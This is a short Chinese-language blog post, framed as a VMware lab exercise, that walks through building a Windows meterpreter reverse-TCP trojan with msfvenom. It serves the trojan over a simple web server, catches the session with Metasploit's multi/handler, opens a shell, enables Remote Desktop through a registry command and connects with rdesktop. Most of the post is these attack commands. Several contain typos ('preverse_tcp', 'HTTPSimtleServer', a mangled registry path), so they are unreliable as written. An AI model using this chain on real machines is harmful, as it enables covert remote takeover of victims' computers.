---
layout:     post
title:      Metasploit，生成木马内网渗透
subtitle:   Metasploit，简单vmware虚拟机内网渗透。
date:       2019-3-17
author:     张云
header-img: img/post-bg-re-vs-ng2.jpg
catalog: true
tags:
    - Blog
---
1.是首先打开kali-linux，（这里我使用的版本是2019.1），打开终端运行msfconsole。
msfconsole
2.等待MSF启动成功，利用MSF下的一插件msfvenom，来生成木马。
msfvenom -p windows/meterpreter/preverse_tcp lhost='这里是输入你本机的ip' lport=‘这里输入你的端口，注意！不要和现在开启的端口冲突’ -f exe >/muma.exe
3.接下来开启一个简单的web服务。
python HTTPSimtleServer 8080.
4.去你的靶机浏览器访问kali的ip+端口并下载木马程序，
5.加载exp。
use exploit/multi/handler
6.设置payload。
set payload windows/meterpreter/preverse_tcp
set lhost '你的ip'
set lport '你的端口'
show options ‘这里查看参数是否都输入对了’。
run‘运行’
7.等待目标上线。
shell 控制目标终端。
8.输入以下命令打开对方3389远程桌面端口。
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
9.利用kali下的rdesktop，链接对方桌面。
rdesktop ‘目标ip’。
10.完成。
